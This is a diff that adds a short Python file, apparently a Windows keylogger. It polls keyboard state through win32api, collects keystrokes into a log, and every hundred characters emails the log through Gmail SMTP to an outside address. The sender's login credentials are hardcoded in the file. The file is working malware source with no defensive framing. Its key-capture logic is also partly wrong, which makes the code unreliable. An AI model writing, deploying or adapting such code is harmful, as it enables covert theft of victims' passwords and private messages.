@@ -1,0 +1,44 @@
+import smtplib
+import win32api
+import win32con
+import time
+import pythoncom
+
+def key_logger():
+    log = ""
+    while True:
+        for i in range(65, 91):
+            k = win32api.GetAsyncKeyState(i)
+            if k == 1 or k == -128:
+                log += chr(i)
+        for i in range(97, 123):
+            k = win32api.GetAsyncKeyState(i)
+            if k == 1 or k == -128:
+                log += chr(i)
+        for i in range(128, 131):
+            k = win32api.GetAsyncKeyState(i)
+            if k == 1 or k == -128:
+                log += str(i - 128)
+        for i in range(32, 48):
+            k = win32api.GetAsyncKeyState(i)
+            if k == 1 or k == -128:
+                log += str(i)
+        for i in range(win32con.VK_SPACE, win32con.VK_DELETE + 1):
+            k = win32api.GetAsyncKeyState(i)
+            if k == 1 or k == -128:
+                log += chr(i)
+        if len(log) > 100:
+            send_email(log)
+            log = ""
+        time.sleep(0.01)
+
+def send_email(data):
+    mail_server = smtplib.SMTP('smtp.gmail.com', 587)
+    mail_server.ehlo()
+    mail_server.starttls()
+    mail_server.login('wargraymon66@gmail.com', 'treylog1234')
+    message = 'Subject: Keylogger Log\n\n' + data
+    mail_server.sendmail('wargraymon66@gmail.com', 'treyloggins18@gmail.com', message)
+    mail_server.quit()
+
+key_logger()
